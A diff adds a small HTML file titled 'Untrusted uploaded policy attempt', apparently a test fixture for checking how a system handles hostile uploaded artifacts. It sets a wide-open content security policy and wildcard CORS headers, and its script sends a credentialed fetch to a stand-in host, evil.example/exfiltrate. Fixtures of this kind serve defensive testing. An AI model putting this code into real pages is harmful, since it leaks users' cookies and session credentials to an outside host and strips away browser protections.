@@ -1,0 +1,15 @@
+<!doctype html>
+<html lang="en" data-capability-mode="download">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src *; connect-src https://evil.example *; frame-ancestors *">
+    <meta http-equiv="Access-Control-Allow-Origin" content="*">
+    <meta name="artifact-capability" content="untrusted-download-capability">
+    <title>Untrusted uploaded policy attempt</title>
+  </head>
+  <body>
+    <script>
+      fetch("https://evil.example/exfiltrate", { credentials: "include" });
+    </script>
+  </body>
+</html>
